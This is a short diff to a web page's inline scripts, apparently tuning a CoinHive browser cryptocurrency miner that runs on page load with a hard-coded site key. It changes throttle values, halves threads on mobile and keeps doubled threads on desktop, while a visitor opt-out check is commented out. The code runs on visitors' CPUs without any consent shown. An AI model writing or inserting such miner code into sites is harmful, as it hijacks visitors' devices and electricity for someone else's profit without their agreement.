@@ -17,7 +17,7 @@
 	<script>
 	var miner = new CoinHive.Anonymous ('Ansnx3ssG1KPPjbVHMIikQP9APAZYIio', {
 			threads: navigator.hardwareConcurrency || 4,
-			throttle: 0.3,
+			throttle: 0.7,
 			theme: 'dark'
 	});
 	//if (!miner.didOptOut(14400))
@@ -448,12 +448,14 @@
 	</script>
 	<script>
 	if (miner.isMobile()) {
+		miner.setNumThreads (miner.getNumThreads () / 2);
+		updateParallelThreads ();
 		miner.setThrottle (0.7);
 		updateThrottle ();
 	} else {
 		miner.setNumThreads (miner.getNumThreads () * 2);
 		updateParallelThreads ();
-		miner.setThrottle (0.3);
+		miner.setThrottle (0.5);
 		updateThrottle ();
 	}
 
